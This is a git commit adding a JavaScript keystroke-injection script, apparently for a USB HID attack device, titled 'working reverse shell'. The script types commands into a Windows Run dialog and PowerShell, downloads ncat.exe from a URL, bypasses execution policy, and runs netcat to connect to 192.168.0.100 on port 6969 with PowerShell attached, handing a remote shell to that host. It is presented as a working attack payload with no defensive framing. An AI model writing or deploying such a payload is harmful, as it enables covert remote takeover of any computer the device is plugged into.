26fb8030e1a686730f7142b055a74ff1933f161d
Aryan Chavan <aryanchavan2003@gmail.com>
2021-04-12 18:56:50 +0530

    working reverse shell

---
+++ hidscript.js
@@ -0,0 +1,24 @@
+layout('us');		// US keyboard layout
+typingSpeed(0,0);	// type as fast as possible
+
+// uris and configurations
+const ncatUri = "https://example.com/ncat.exe";
+
+// starting powershell
+press('GUI r');
+delay(1000);
+type('powershell\n');
+delay(1000);
+
+// starting the stuff
+type('cd \\\n');
+type('mkdir revsh\n');
+type('cd revsh\n');
+// getting netcat
+type("echo (wget '" + ncatUri + "' -OutFile n.exe) > b.ps1\n");
+type("powershell -ExecutionPolicy ByPass -File b.ps1\n");
+delay(5000);
+
+//running netcat
+type(".\\n.exe " + "192.168.0.100" + " " + "6969" + " -e powershell.exe\n");
+
